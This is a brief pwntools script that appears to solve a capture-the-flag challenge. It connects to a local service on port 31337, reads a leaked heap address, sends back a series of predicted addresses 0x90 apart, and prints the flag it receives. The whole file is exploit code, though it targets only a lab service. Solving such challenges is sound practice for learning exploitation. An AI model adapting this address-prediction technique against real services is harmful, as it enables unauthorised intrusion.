from pwn import *

HOST, PORT = '127.0.0.1', 31337
r = remote(HOST, PORT)

r.recvuntil('-> ')
head = r.recvline().decode().strip()
head = int(head, 16)
r.sendline(hex(head))
for i in range(5):
    r.recvuntil(': ')
    head += 0x90
    r.sendline(hex(head))
flag = r.recvline().decode().split()[-1]
print(flag)
r.interactive()